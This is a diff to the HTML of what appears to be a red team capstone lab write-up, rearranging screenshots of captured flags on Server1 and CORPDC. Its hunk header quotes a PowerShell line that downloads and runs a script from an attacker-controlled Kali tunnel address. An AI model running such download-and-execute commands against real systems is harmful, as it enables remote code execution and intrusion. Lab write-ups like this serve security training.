@@ -742,13 +742,14 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <div class="flag-grid">
 <figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence in Windows Temp on Server1" width="1016" height="458" loading="lazy"></a><figcaption>Flag 5 — Server1 · Windows Temp</figcaption></figure>
 <figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence under Administrator on Server1" width="1016" height="328" loading="lazy"></a><figcaption>Flag 6 — Server1 · Administrator</figcaption></figure>
+<figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-03.png" alt="Flag 7 email and CORPDC evidence" width="1016" height="470" loading="lazy"></a><figcaption>Flag 7 — CORPDC</figcaption></figure>
 <figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence under Administrator on CORPDC" width="1016" height="400" loading="lazy"></a><figcaption>Flag 8 — CORPDC · Administrator</figcaption></figure>
 </div>
 </section>
 
 <!-- PDF page 42 -->
 <section id="pdf-page-42" class="pdf-source-section" data-pdf-page="42" aria-label="Source page 42">
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-03.png" alt="Additional evidence" width="1016" height="470" loading="lazy"></a></figure>
+
 </section>
 
 <!-- PDF page 43 -->
